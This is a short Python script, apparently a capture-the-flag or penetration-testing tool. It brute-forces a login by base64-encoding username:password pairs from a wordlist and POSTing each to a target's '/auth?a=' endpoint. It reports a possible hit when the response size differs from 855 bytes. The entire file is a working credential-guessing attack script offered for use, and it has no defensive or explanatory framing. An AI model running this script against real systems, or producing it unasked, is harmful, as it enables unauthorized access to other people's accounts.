import requests as req
import argparse, base64

def encode(user, passwd):
    return base64.b64encode((user+":"+passwd).encode('ascii')).decode('ascii')


def do_auth(uri, user, passwd):
    auth_uri = '/auth?a='
    resp = req.post(uri+auth_uri+encode(user, passwd))
    if len(resp.content) != 855: print("Possible Hit!\nUser: {}\nPass: {}\nResp Size: {}".format(user, passwd, len(resp.content)))

def read_wordlist(wordlist):
    with open(wordlist, 'r') as f:
        passwds = f.read().splitlines() 
    return passwds

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--host", help="destination host")
    p.add_argument("-d", "--wordlist", help="wordlist to bruteforce")
    p.add_argument("-u", "--username", help="username to test")
    args = p.parse_args()
    host, wordlist, username = args.host, args.wordlist, args.username
    wl = read_wordlist(wordlist)
    for p in wl: 
        lengthOfResp = do_auth(host, username, p)
        